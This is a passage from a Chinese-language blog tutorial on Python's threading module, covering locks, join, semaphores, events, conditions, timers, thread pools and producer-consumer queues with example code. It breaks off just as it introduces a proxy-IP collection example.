%s&apos; % (threading.current_thread().name, n)</span><br><span class="line">        #输出当前线程名字  和循环的参数n</span><br><span class="line">    print &apos;thread %s ended.&apos; % threading.current_thread().name</span><br><span class="line">    l.release()</span><br><span class="line">    # 这里是把线程锁解开，可以再运行写一个线程</span><br><span class="line">print &apos;thread %s is running...&apos; % threading.current_thread().name</span><br><span class="line"></span><br><span class="line">#下面的一部分就是threading的核心用法</span><br><span class="line">#包括target name args 之类的 一般我只用targer=你定义的函数名</span><br><span class="line">t = threading.Thread(target=loop, name=&apos;线程名:&apos;)</span><br><span class="line">l = threading.Lock()</span><br><span class="line"># 这里申明一个线程锁</span><br><span class="line">t.start()</span><br><span class="line">#开始</span><br><span class="line">t.join()</span><br><span class="line">#关于join的相关信息我会在后面的代码详说</span><br><span class="line">print &apos;thread %s ended.&apos; % threading.current_thread().name</span><br></pre></td></tr></table></figure>

<p>使用线程锁后，程序按照一个一个有序执行。其中lock还有Rlock的方法，RLock允许在同一线程中被多次acquire。而Lock却不允许这种情况。否则会出现死循环，程序不知道解哪一把锁。注意：如果使用RLock，那么acquire和release必须成对出现，即调用了n次acquire，必须调用n次的release才能真正释放所占用的锁</p>
<h4 id="案例三-join-方法的使用"><a href="#案例三-join-方法的使用" class="headerlink" title="案例三 join()方法的使用"></a>案例三 join()方法的使用</h4><p>在多线程中，每个线程自顾执行自己的任务，当最后一个线程运行完毕后再退出，所以这个时候如果你要打印信息的话，会看到打印出来的信息错乱无章，有的时候希望主线程能够等子线程执行完毕后在继续执行，就是用join()方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</span><br><span class="line">t00 = time.time()</span><br><span class="line"># 获取当前时间戳</span><br><span class="line">def cs1():</span><br><span class="line">    time0 = time.time()</span><br><span class="line">    for x in range(9):</span><br><span class="line">        print x + time.time()-time0</span><br><span class="line">        # 计算用了多少时间</span><br><span class="line">        print threading.current_thread().name</span><br><span class="line">        # 打印这个线程名字</span><br><span class="line"></span><br><span class="line">def cs2():</span><br><span class="line">    for x1 in range(6,9):</span><br><span class="line">        print x1</span><br><span class="line">        print threading.current_thread().name</span><br><span class="line"></span><br><span class="line">threads=[]</span><br><span class="line"># 定义一个空的列表</span><br><span class="line">t1 = threading.Thread(target=cs1)</span><br><span class="line">t2 = threading.Thread(target=cs2)</span><br><span class="line">threads.append(t1)</span><br><span class="line">threads.append(t2)</span><br><span class="line"># 把这两个线程的任务加载到这个列表中</span><br><span class="line">for x in threads:</span><br><span class="line">    x.start()</span><br><span class="line">    # 然后执行，这个案例很常用，就是有多个函数要多线程执行的时候用到</span><br><span class="line">    # 如果一个程序有多个函数，但是你只想其中的某一个或者某两个函数多线程，用法一样加入空的列表即可</span><br><span class="line">    x.join()</span><br><span class="line">    #线程堵塞 先运行第一个在运行第二个</span><br><span class="line">#x.join()</span><br><span class="line">#注意你的join放在这里是没有意义的，和不加join一样。线程不堵塞  但是会出现不匀称的表现  并且会修改不同线程中的变量</span><br><span class="line">print &apos;use time.&#123;&#125;&apos;.format(time.time()-t00)</span><br></pre></td></tr></table></figure>

<p>关于setDaemon()的概念就是：主线程A中，创建了子线程B，并且在主线程A中调用了B.setDaemon(),这个的意思是，把主线程A设置为守护线程，这时候，要是主线程A执行结束了，就不管子线程B是否完成,一并和主线程A退出.这就是setDaemon方法的含义，这基本和join是相反的。此外，还有个要特别注意的：必须在start() 方法调用之前设置，如果不设置为守护线程，程序会被无限挂起。</p>
<h4 id="案例四-线程锁之信号Semaphore"><a href="#案例四-线程锁之信号Semaphore" class="headerlink" title="案例四 线程锁之信号Semaphore"></a>案例四 线程锁之信号Semaphore</h4><p>类名：BoundedSemaphore。这种锁允许一定数量的线程同时更改数据，它不是互斥锁。比如地铁安检，排队人很多，工作人员只允许一定数量的人进入安检区，其它的人继续排队。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def run(n, se):</span><br><span class="line">    se.acquire()</span><br><span class="line">    print(&quot;run the thread: %s&quot; % n)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    se.release()</span><br><span class="line"></span><br><span class="line"># 设置允许5个线程同时运行</span><br><span class="line">semaphore = threading.BoundedSemaphore(5)</span><br><span class="line">for i in range(20):</span><br><span class="line">    t = threading.Thread(target=run, args=(i,semaphore))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<p>运行后，可以看到5个一批的线程被放行。</p>
<h4 id="案例五-线程锁之事件Event"><a href="#案例五-线程锁之事件Event" class="headerlink" title="案例五 线程锁之事件Event"></a>案例五 线程锁之事件Event</h4><p>事件线程锁的运行机制：<br>全局定义了一个Flag，如果Flag的值为False，那么当程序执行wait()方法时就会阻塞，如果Flag值为True，线程不再阻塞。这种锁，类似交通红绿灯（默认是红灯），它属于在红灯的时候一次性阻挡所有线程，在绿灯的时候，一次性放行所有排队中的线程。<br>事件主要提供了四个方法set()、wait()、clear()和is_set()。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">调用clear()方法会将事件的Flag设置为False。</span><br><span class="line">调用set()方法会将Flag设置为True。</span><br><span class="line">调用wait()方法将等待“红绿灯”信号。</span><br><span class="line">is_set():判断当前是否&quot;绿灯放行&quot;状态</span><br></pre></td></tr></table></figure>

<p>下面是一个模拟红绿灯，然后汽车通行的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#利用Event类模拟红绿灯</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">event = threading.Event()</span><br><span class="line"># 定义一个事件的对象</span><br><span class="line">def lighter():</span><br><span class="line">    green_time = 5       </span><br><span class="line">    # 绿灯时间</span><br><span class="line">    red_time = 5         </span><br><span class="line">    # 红灯时间</span><br><span class="line">    event.set()          </span><br><span class="line">    # 初始设为绿灯</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;\33[32;0m 绿灯亮...\033[0m&quot;)</span><br><span class="line">        time.sleep(green_time)</span><br><span class="line">        event.clear()</span><br><span class="line">        print(&quot;\33[31;0m 红灯亮...\033[0m&quot;)</span><br><span class="line">        time.sleep(red_time)</span><br><span class="line">        event.set()</span><br><span class="line"></span><br><span class="line">def run(name):</span><br><span class="line">    while True:</span><br><span class="line">        if event.is_set():      </span><br><span class="line">        # 判断当前是否&quot;放行&quot;状态</span><br><span class="line">            print(&quot;一辆[%s] 呼啸开过...&quot; % name)</span><br><span class="line">            time.sleep(1)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;一辆[%s]开来，看到红灯，无奈的停下了...&quot; % name)</span><br><span class="line">            event.wait()</span><br><span class="line">            print(&quot;[%s] 看到绿灯亮了，瞬间飞起.....&quot; % name)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    light = threading.Thread(target=lighter,)</span><br><span class="line">    light.start()</span><br><span class="line">        for name in [&apos;奔驰&apos;, &apos;宝马&apos;, &apos;奥迪&apos;]:</span><br><span class="line">        car = threading.Thread(target=run, args=(name,))</span><br><span class="line">        car.start()</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绿灯亮...</span><br><span class="line">一辆[奔驰] 呼啸开过...</span><br><span class="line">一辆[宝马] 呼啸开过...</span><br><span class="line">一辆[奥迪] 呼啸开过...</span><br><span class="line">一辆[奥迪] 呼啸开过...</span><br><span class="line">......</span><br><span class="line"> 红灯亮...</span><br><span class="line">一辆[宝马]开来，看到红灯，无奈的停下了...</span><br><span class="line">一辆[奥迪]开来，看到红灯，无奈的停下了...</span><br><span class="line">一辆[奔驰]开来，看到红灯，无奈的停下了...</span><br><span class="line">绿灯亮...</span><br><span class="line">[奥迪] 看到绿灯亮了，瞬间飞起.....</span><br><span class="line">一辆[奥迪] 呼啸开过...</span><br><span class="line">[奔驰] 看到绿灯亮了，瞬间飞起.....</span><br><span class="line">一辆[奔驰] 呼啸开过...</span><br><span class="line">[宝马] 看到绿灯亮了，瞬间飞起.....</span><br><span class="line">一辆[宝马] 呼啸开过...</span><br><span class="line">一辆[奥迪] 呼啸开过...</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h4 id="案例六-线程锁之条件Condition"><a href="#案例六-线程锁之条件Condition" class="headerlink" title="案例六 线程锁之条件Condition"></a>案例六 线程锁之条件Condition</h4><p>Condition称作条件锁，依然是通过acquire()/release()加锁解锁。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wait([timeout])方法将使线程进入Condition的等待池等待通知，并释放锁。使用前线程必须已获得锁定，否则将抛出异常。</span><br><span class="line">notify()方法将从等待池挑选一个线程并通知，收到通知的线程将自动调用acquire()尝试获得锁定（进入锁定池），其他线程仍然在等待池中。调用这个方法不会释放锁定。使用前线程必须已获得锁定，否则将抛出异常。</span><br><span class="line">notifyAll()方法将通知等待池中所有的线程，这些线程都将进入锁定池尝试获得锁定。调用这个方法不会释放锁定。使用前线程必须已获得锁定，否则将抛出异常。</span><br></pre></td></tr></table></figure>

<p>实际案例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">num = 0</span><br><span class="line">con = threading.Condition()</span><br><span class="line">class Foo(threading.Thread):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, action):</span><br><span class="line">        super(Foo, self).__init__()</span><br><span class="line">        self.name = name</span><br><span class="line">        self.action = action</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        global num</span><br><span class="line">        con.acquire()</span><br><span class="line">        print(&quot;%s开始执行...&quot; % self.name)</span><br><span class="line">        while True:</span><br><span class="line">            if self.action == &quot;add&quot;:</span><br><span class="line">                num += 1</span><br><span class="line">            elif self.action == &apos;reduce&apos;:</span><br><span class="line">                num -= 1</span><br><span class="line">            else:</span><br><span class="line">                exit(1)</span><br><span class="line">            print(&quot;num当前为：&quot;, num)</span><br><span class="line">            time.sleep(1)</span><br><span class="line">            if num == 5 or num == 0:</span><br><span class="line">                print(&quot;暂停执行%s！&quot; % self.name)</span><br><span class="line">                con.notify()</span><br><span class="line">                con.wait()</span><br><span class="line">                print(&quot;%s开始执行...&quot; % self.name)</span><br><span class="line">        con.release()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    a = Foo(&quot;线程A&quot;, &apos;add&apos;)</span><br><span class="line">    b = Foo(&quot;线程B&quot;, &apos;reduce&apos;)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure>

<p>如果不强制停止，程序会一直执行下去，并循环下面的结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">线程A开始执行...</span><br><span class="line">num当前为： 1</span><br><span class="line">num当前为： 2</span><br><span class="line">num当前为： 3</span><br><span class="line">num当前为： 4</span><br><span class="line">num当前为： 5</span><br><span class="line">暂停执行线程A！</span><br><span class="line">线程B开始执行...</span><br><span class="line">num当前为： 4</span><br><span class="line">num当前为： 3</span><br><span class="line">num当前为： 2</span><br><span class="line">num当前为： 1</span><br><span class="line">num当前为： 0</span><br><span class="line">暂停执行线程B！</span><br><span class="line">线程A开始执行...</span><br><span class="line">num当前为： 1</span><br><span class="line">num当前为： 2</span><br><span class="line">num当前为： 3</span><br><span class="line">num当前为： 4</span><br><span class="line">num当前为： 5</span><br><span class="line">暂停执行线程A！</span><br><span class="line">线程B开始执行...</span><br></pre></td></tr></table></figure>

<h4 id="案例-七定时器"><a href="#案例-七定时器" class="headerlink" title="案例 七定时器"></a>案例 七定时器</h4><p>定时器Timer类是threading模块中的一个小工具，用于指定n秒后执行某操作。一个简单但很实用的东西。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from threading import Timer</span><br><span class="line">def hello():</span><br><span class="line">    print(&quot;hello, world&quot;)</span><br><span class="line">t = Timer(1, hello)</span><br><span class="line"># 表示1秒后执行hello函数</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure>

<h4 id="案例八-通过with语句使用线程锁"><a href="#案例八-通过with语句使用线程锁" class="headerlink" title="案例八 通过with语句使用线程锁"></a>案例八 通过with语句使用线程锁</h4><p>类似于上下文管理器，所有的线程锁都有一个加锁和释放锁的动作，非常类似文件的打开和关闭。在加锁后，如果线程执行过程中出现异常或者错误，没有正常的释放锁，那么其他的线程会造到致命性的影响。通过with上下文管理器，可以确保锁被正常释放。其格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with some_lock:</span><br><span class="line">    # 执行任务...</span><br></pre></td></tr></table></figure>

<p>这相当于：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">some_lock.acquire()</span><br><span class="line">try:</span><br><span class="line">    # 执行任务..</span><br><span class="line">finally:</span><br><span class="line">    some_lock.release()</span><br></pre></td></tr></table></figure>

<h2 id="threading-的常用属性"><a href="#threading-的常用属性" class="headerlink" title="threading 的常用属性"></a>threading 的常用属性</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">current_thread()    返回当前线程</span><br><span class="line">active_count()    返回当前活跃的线程数，1个主线程+n个子线程</span><br><span class="line">get_ident()    返回当前线程</span><br><span class="line">enumerater()    返回当前活动 Thread 对象列表</span><br><span class="line">main_thread()    返回主 Thread 对象</span><br><span class="line">settrace(func)    为所有线程设置一个 trace 函数</span><br><span class="line">setprofile(func)    为所有线程设置一个 profile 函数</span><br><span class="line">stack_size([size])    返回新创建线程栈大小；或为后续创建的线程设定栈大小为 size</span><br><span class="line">TIMEOUT_MAX    Lock.acquire(), RLock.acquire(), Condition.wait() 允许的最大超时时间</span><br></pre></td></tr></table></figure>

<h2 id="线程池-threadingpool"><a href="#线程池-threadingpool" class="headerlink" title="线程池 threadingpool"></a>线程池 threadingpool</h2><p>在使用多线程处理任务时也不是线程越多越好。因为在切换线程的时候，需要切换上下文环境，线程很多的时候，依然会造成CPU的大量开销。为解决这个问题，线程池的概念被提出来了。</p>
<p>预先创建好一个数量较为优化的线程组，在需要的时候立刻能够使用，就形成了线程池。在Python中，没有内置的较好的线程池模块，需要自己实现或使用第三方模块。<br>需要注意的是，线程池的整体构造需要自己精心设计，比如某个函数定义存在多少个线程，某个函数定义什么时候运行这个线程，某个函数定义去获取线程获取任务，某个线程设置线程守护(线程锁之类的)，等等…<br>在网上找了几个案例，供大家学习参考。</p>
<p>下面是一个简单的线程池：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import queue</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">class MyThreadPool:</span><br><span class="line">    def __init__(self, maxsize=5):</span><br><span class="line">        self.maxsize = maxsize</span><br><span class="line">        self._pool = queue.Queue(maxsize)   # 使用queue队列，创建一个线程池</span><br><span class="line">        for _ in range(maxsize):</span><br><span class="line">            self._pool.put(threading.Thread)</span><br><span class="line">    def get_thread(self):</span><br><span class="line">        return self._pool.get()</span><br><span class="line"></span><br><span class="line">    def add_thread(self):</span><br><span class="line">        self._pool.put(threading.Thread)</span><br><span class="line"></span><br><span class="line">def run(i, pool):</span><br><span class="line">    print(&apos;执行任务&apos;, i)</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    pool.add_thread()   # 执行完毕后，再向线程池中添加一个线程类</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    pool = MyThreadPool(5)  # 设定线程池中最多只能有5个线程类</span><br><span class="line">    for i in range(20):</span><br><span class="line">        t = pool.get_thread()   # 每个t都是一个线程类</span><br><span class="line">        obj = t(target=run, args=(i, pool)) # 这里的obj才是正真的线程对象</span><br><span class="line">        obj.start()</span><br><span class="line">    print(&quot;活动的子线程数： &quot;, threading.active_count()-1)</span><br></pre></td></tr></table></figure>

<p>分析一下上面的代码：</p>
<ol>
<li>实例化一个MyThreadPool的对象，在其内部建立了一个最多包含5个元素的阻塞队列，并一次性将5个Thread类型添加进去。</li>
<li>循环100次，每次从pool中获取一个thread类，利用该类，传递参数，实例化线程对象。</li>
<li>在run()方法中，每当任务完成后，又为pool添加一个thread类，保持队列中始终有5个thread类。</li>
<li>一定要分清楚，代码里各个变量表示的内容。t表示的是一个线程类，也就是threading.Thread，而obj才是正真的线程对象。</li>
</ol>
<p>上面的例子是把线程类当做元素添加到队列内，从而实现的线程池。这种方法比较糙，每个线程使用后就被抛弃，并且一开始就将线程开到满，因此性能较差。下面是一个相对好一点的例子，在这个例子中，队列里存放的不再是线程类，而是任务，线程池也不是一开始就直接开辟所有线程，而是根据需要，逐步建立，直至池满。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">一个基于thread和queue的线程池，以任务为队列元素，动态创建线程，重复利用线程，</span><br><span class="line">通过close和terminate方法关闭线程池。</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line">import contextlib</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 创建空对象,用于停止线程</span><br><span class="line">StopEvent = object()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def callback(status, result):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    根据需要进行的回调函数，默认不执行。</span><br><span class="line">    :param status: action函数的执行状态</span><br><span class="line">    :param result: action函数的返回值</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def action(thread_name, arg):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    真实的任务定义在这个函数里</span><br><span class="line">    :param thread_name: 执行该方法的线程名</span><br><span class="line">    :param arg: 该函数需要的参数</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 模拟该函数执行了0.1秒</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    print(&quot;第%s个任务调用了线程 %s，并打印了这条信息！&quot; % (arg+1, thread_name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ThreadPool:</span><br><span class="line"></span><br><span class="line">    def __init__(self, max_num, max_task_num=None):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        初始化线程池</span><br><span class="line">        :param max_num: 线程池最大线程数量</span><br><span class="line">        :param max_task_num: 任务队列长度</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 如果提供了最大任务数的参数，则将队列的最大元素个数设置为这个值。</span><br><span class="line">        if max_task_num:</span><br><span class="line">            self.q = queue.Queue(max_task_num)</span><br><span class="line">        # 默认队列可接受无限多个的任务</span><br><span class="line">        else:</span><br><span class="line">            self.q = queue.Queue()</span><br><span class="line">        # 设置线程池最多可实例化的线程数</span><br><span class="line">        self.max_num = max_num</span><br><span class="line">        # 任务取消标识</span><br><span class="line">        self.cancel = False</span><br><span class="line">        # 任务中断标识</span><br><span class="line">        self.terminal = False</span><br><span class="line">        # 已实例化的线程列表</span><br><span class="line">        self.generate_list = []</span><br><span class="line">        # 处于空闲状态的线程列表</span><br><span class="line">        self.free_list = []</span><br><span class="line"></span><br><span class="line">    def put(self, func, args, callback=None):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        往任务队列里放入一个任务</span><br><span class="line">        :param func: 任务函数</span><br><span class="line">        :param args: 任务函数所需参数</span><br><span class="line">        :param callback: 任务执行失败或成功后执行的回调函数，回调函数有两个参数</span><br><span class="line">        1、任务函数执行状态；2、任务函数返回值（默认为None，即：不执行回调函数）</span><br><span class="line">        :return: 如果线程池已经终止，则返回True否则None</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 先判断标识，看看任务是否取消了</span><br><span class="line">        if self.cancel:</span><br><span class="line">            return</span><br><span class="line">        # 如果没有空闲的线程，并且已创建的线程的数量小于预定义的最大线程数，则创建新线程。</span><br><span class="line">        if len(self.free_list) == 0 and len(self.generate_list) &lt; self.max_num:</span><br><span class="line">            self.generate_thread()</span><br><span class="line">        # 构造任务参数元组，分别是调用的函数，该函数的参数，回调函数。</span><br><span class="line">        w = (func, args, callback,)</span><br><span class="line">        # 将任务放入队列</span><br><span class="line">        self.q.put(w)</span><br><span class="line"></span><br><span class="line">    def generate_thread(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        创建一个线程</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 每个线程都执行call方法</span><br><span class="line">        t = threading.Thread(target=self.call)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    def call(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        循环去获取任务函数并执行任务函数。在正常情况下，每个线程都保存生存状态，  直到获取线程终止的flag。</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 获取当前线程的名字</span><br><span class="line">        current_thread = threading.currentThread().getName()</span><br><span class="line">        # 将当前线程的名字加入已实例化的线程列表中</span><br><span class="line">        self.generate_list.append(current_thread)</span><br><span class="line">        # 从任务队列中获取一个任务</span><br><span class="line">        event = self.q.get()</span><br><span class="line">        # 让获取的任务不是终止线程的标识对象时</span><br><span class="line">        while event != StopEvent:</span><br><span class="line">            # 解析任务中封装的三个参数</span><br><span class="line">            func, arguments, callback = event</span><br><span class="line">            # 抓取异常，防止线程因为异常退出</span><br><span class="line">            try:</span><br><span class="line">                # 正常执行任务函数</span><br><span class="line">                result = func(current_thread, *arguments)</span><br><span class="line">                success = True</span><br><span class="line">            except Exception as e:</span><br><span class="line">                # 当任务执行过程中弹出异常</span><br><span class="line">                result = None</span><br><span class="line">                success = False</span><br><span class="line">            # 如果有指定的回调函数</span><br><span class="line">            if callback is not None:</span><br><span class="line">                # 执行回调函数，并抓取异常</span><br><span class="line">                try:</span><br><span class="line">                    callback(success, result)</span><br><span class="line">                except Exception as e:</span><br><span class="line">                    pass</span><br><span class="line">            # 当某个线程正常执行完一个任务时，先执行worker_state方法</span><br><span class="line">            with self.worker_state(self.free_list, current_thread):</span><br><span class="line">                # 如果强制关闭线程的flag开启，则传入一个StopEvent元素</span><br><span class="line">                if self.terminal:</span><br><span class="line">                    event = StopEvent</span><br><span class="line">                # 否则获取一个正常的任务，并回调worker_state方法的yield语句</span><br><span class="line">                else:</span><br><span class="line">                    # 从这里开始又是一个正常的任务循环</span><br><span class="line">                    event = self.q.get()</span><br><span class="line">        else:</span><br><span class="line">            # 一旦发现任务是个终止线程的标识元素，将线程从已创建线程列表中删除</span><br><span class="line">            self.generate_list.remove(current_thread)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def close(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        执行完所有的任务后，让所有线程都停止的方法</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 设置flag</span><br><span class="line">        self.cancel = True</span><br><span class="line">        # 计算已创建线程列表中线程的个数，</span><br><span class="line">        # 然后往任务队列里推送相同数量的终止线程的标识元素</span><br><span class="line">        full_size = len(self.generate_list)</span><br><span class="line">        while full_size:</span><br><span class="line">            self.q.put(StopEvent)</span><br><span class="line">            full_size -= 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def terminate(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        在任务执行过程中，终止线程，提前退出。</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.terminal = True</span><br><span class="line">        # 强制性的停止线程</span><br><span class="line">        while self.generate_list:</span><br><span class="line">            self.q.put(StopEvent)</span><br><span class="line"></span><br><span class="line"># 该装饰器用于上下文管理</span><br><span class="line">    @contextlib.contextmanager</span><br><span class="line">    def worker_state(self, state_list, worker_thread):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        用于记录空闲的线程，或从空闲列表中取出线程处理任务</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 将当前线程，添加到空闲线程列表中</span><br><span class="line">        state_list.append(worker_thread)</span><br><span class="line">        # 捕获异常</span><br><span class="line">        try:</span><br><span class="line">            # 在此等待</span><br><span class="line">            yield</span><br><span class="line">        finally:</span><br><span class="line">            # 将线程从空闲列表中移除</span><br><span class="line">            state_list.remove(worker_thread)</span><br><span class="line"></span><br><span class="line"># 调用方式</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    # 创建一个最多包含5个线程的线程池</span><br><span class="line">    pool = ThreadPool(5)</span><br><span class="line">    # 创建100个任务，让线程池进行处理</span><br><span class="line">    for i in range(100):</span><br><span class="line">        pool.put(action, (i,), callback)</span><br><span class="line">    # 等待一定时间，让线程执行任务</span><br><span class="line">    time.sleep(3)</span><br><span class="line">    print(&quot;-&quot; * 50)</span><br><span class="line">    print(&quot;\033[32;0m任务停止之前线程池中有%s个线程，空闲的线程有%s个！\033[0m&quot;</span><br><span class="line">          % (len(pool.generate_list), len(pool.free_list)))</span><br><span class="line">    # 正常关闭线程池</span><br><span class="line">    pool.close()</span><br><span class="line">    print(&quot;任务执行完毕，正常退出！&quot;)</span><br><span class="line">    # 强制关闭线程池</span><br><span class="line">    # pool.terminate()</span><br><span class="line">    # print(&quot;强制停止任务！&quot;)</span><br></pre></td></tr></table></figure>

<p>关于线程池其实涉及到工程设计，需要自己很熟练的运行面向对象程序设计。</p>
<h2 id="生产者和消费者模式"><a href="#生产者和消费者模式" class="headerlink" title="生产者和消费者模式"></a>生产者和消费者模式</h2><p>生产者就是生成任务，消费者就是解决处理任务。比如在一个程序中，代码是按照重上往下执行，有的时候做等待的时间完全可以用来做任务处理或者做别的事情，为了节省时间，可以借助多线程的功能（自顾自完成自己线程任务）加上Queue队列特性（管道模式。里面存储数据，然后提供给线程处理）完成生产者和消费者模式。关于Queue的用法参考我之前的文章。</p>
<h4 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import Queue</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;utf-8&apos;)</span><br><span class="line">q = Queue.Queue(10)</span><br><span class="line">def get(i):</span><br><span class="line">    # 这个函数用来生产任务，接受参数i，也可以不传入参数</span><br><span class="line">    while 1:</span><br><span class="line">        time.sleep(2)</span><br><span class="line">        # 这里可以做一些动作，比如过去网站的网址之类的</span><br><span class="line">        q.put(i)</span><br><span class="line">        # 然后把得到的数据放在消息队列中</span><br><span class="line">def fun(o):</span><br><span class="line">    # 这个函数用来处理任务，必须要接受参数</span><br><span class="line">    q.get(o)</span><br><span class="line">    # 得到获取接受来的参数</span><br><span class="line">    print o*10</span><br><span class="line">    # 然后对获取的参数作处理，我这里仅仅打印数据乘以10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    # 生产任务启动，有100个任务量要产生</span><br><span class="line">    t1 = threading.Thread(target=get, args=(i,))</span><br><span class="line">    t1.start()</span><br><span class="line">for o in range(100):</span><br><span class="line">    # 处理任务启动</span><br><span class="line">    t = threading.Thread(target=fun, args=(o,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<p>上面这个代码主要是针对骨架进行拆分解说，一般的生产者消费者模式都是这种构架，下面用一个更加清晰的案例来帮助理解。</p>
<h4 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import time</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">q = queue.Queue(10)     # 生成一个队列，用来保存“包子”，最大数量为10</span><br><span class="line"></span><br><span class="line">def productor(i):</span><br><span class="line">    # 厨师不停地每2秒做一个包子</span><br><span class="line">    while True:</span><br><span class="line">        q.put(&quot;厨师 %s 做的包子！&quot; % i)</span><br><span class="line">        time.sleep(2)</span><br><span class="line"></span><br><span class="line">def consumer(j):</span><br><span class="line">    # 顾客不停地每秒吃一个包子</span><br><span class="line">    while True:</span><br><span class="line">        print(&quot;顾客 %s 吃了一个 %s&quot;%(j,q.get()))</span><br><span class="line">        time.sleep(1)</span><br><span class="line"></span><br><span class="line"># 实例化了3个生产者（厨师）</span><br><span class="line">for i in range(3):</span><br><span class="line">    t = threading.Thread(target=productor, args=(i,))</span><br><span class="line">    t.start()</span><br><span class="line"># 实例化了10个消费者（顾客）</span><br><span class="line">for j in range(10):</span><br><span class="line">    v = threading.Thread(target=consumer, args=(j,))</span><br><span class="line">    v.start()</span><br></pre></td></tr></table></figure>

<h4 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h4><p>使用生产者消费者模式实现代理IP扫描并且同步扫描代理IP是否可用，如果不适用生产者消费者模式的话，首先要获取代理IP，然后把获取到的IP放在一个列表，然后在扫描列表的IP，扫描过程为—-&gt;获取IP—-&gt;IP保存—-&gt;IP存活扫描。过程是单向的，也就是说没办法同步一边获取IP然后马上验证。</p>
<p>下面的代码是用生产者消费者模式实现代理IP的获取与存活扫描。</p>
